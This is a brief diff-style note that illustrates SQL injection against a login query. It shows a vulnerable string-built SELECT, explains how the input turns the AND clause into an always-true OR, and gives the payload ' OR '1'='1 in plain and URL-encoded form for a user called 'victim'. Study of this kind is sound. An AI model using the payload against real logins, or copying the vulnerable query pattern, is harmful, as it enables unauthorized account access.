@@ -1,0 +1,7 @@
+validateUser query: "SELECT id FROM users WHERE username='victim' AND password='input_pass';
+
+turns AND into AND ( x OR y), where y always evaluates to true
+' OR '1'='1
+
+
+username=victim&password=%27%20OR%20%271%27%3D%271
